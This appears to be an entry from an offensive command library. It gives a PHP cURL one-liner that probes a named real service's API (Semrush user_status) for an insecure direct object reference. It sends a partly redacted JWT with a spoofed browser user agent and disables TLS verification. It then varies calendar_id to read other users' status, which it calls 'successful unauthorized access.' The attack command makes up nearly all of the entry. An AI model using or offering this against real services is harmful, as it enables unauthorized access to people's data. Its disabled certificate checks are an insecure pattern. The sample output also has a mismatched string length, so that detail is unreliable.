---
data: >-
  $curl = curl_init(); $opts = [ CURLOPT_URL =>
  'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=12345',
  CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0)
  Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'],
  CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false,
  CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response
  = json_decode(curl_exec($curl), true); var_dump($response);
tags:
  - curl
  - api-test
  - idor
type: command
output: |-
  JSON response dumped, e.g., array(2) { ["id"]=>
    int(67890)
    ["status"]=>
    string(11) "NON_AUTHORISED"
  }
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.350Z'
id: bbbe2778-13b2-41f2-82aa-bc1cc23a88e6
verified: false
validated: true
submitted: true
---
# php-curl-semrush-user-status-test

## Command

```php
$curl = curl_init(); $opts = [ CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=12345', CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response = json_decode(curl_exec($curl), true); var_dump($response);
```

## Description

This PHP one-liner initializes a cURL session to test the Semrush API endpoint for IDOR by sending a GET request with an arbitrary calendar_id, authenticating via JWT, and dumping the response to verify unauthorized access to user status data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CURLOPT_URL | Target API URL with calendar_id parameter | Yes |
| calendar_id | Specific ID to test (e.g., 12345) | Yes |
| CURLOPT_USERAGENT | Spoofed browser user agent string | Yes |
| CURLOPT_HTTPHEADER | Array with Authorization: JWT token | Yes |
| CURLOPT_RETURNTRANSFER | Return response as string | Yes |
| CURLOPT_SSL_VERIFYHOST | Disable SSL host verification (false) | No |
| CURLOPT_SSL_VERIFYPEER | Disable SSL peer verification (false) | No |

## Examples

### Basic Usage

```php
php -r "$curl = curl_init(); ... var_dump($response);"
```

### Advanced Usage

Modify calendar_id in CURLOPT_URL for different tests:

```php
CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=54321'
```

## Expected Output

Dumped JSON array containing 'id' (user_id) and 'status' (e.g., AUTHORISED or NON_AUTHORISED) for the specified calendar_id, indicating successful unauthorized access.

## Related

- [[Related Procedure: Test-IDOR-Access-with-Arbitrary-Calendar-IDs]]
